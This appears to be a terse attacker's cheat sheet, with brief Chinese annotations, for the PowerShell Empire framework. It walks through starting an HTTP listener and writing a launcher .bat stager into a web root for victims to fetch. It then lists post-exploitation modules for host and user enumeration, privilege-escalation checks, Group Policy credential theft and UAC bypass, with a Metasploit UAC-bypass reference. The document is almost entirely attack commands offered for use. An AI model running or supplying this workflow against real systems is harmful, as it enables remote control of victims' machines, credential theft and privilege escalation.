```
powershell-empire server

powershell-empire client

uselistener http

set Name test
set Port 8899
execute

back
listeners

usestager windows/launcher_bat

set Listener test
set OutFile /var/www/html/33.bat
execute

agents
```

```
usemodule powershell/situational_awareness/host/winenum
winenum 模块收集有关主机和当前用户上下文的狂欢信息。
interact X1PWR3HT查看结果
```

```
usemodule powershell/situational_awareness/host/computerdetails
计算机详细信息模块枚举系统上的有用信息
interact X1PWR3HT查看结果
```

```
 usemodule powershell/situational_awareness/network/powerview/user_hunter
 
```

```
 查找系统中的漏洞
 usemodule powershell/privesc/powerup/allchecks
```

```
usemodule powershell/privesc/gpp
获取组策略的凭据
内存
exploit/windows/local/bypassuac_injection 
```

```
usemodule powershell/privesc/bypassuac

```

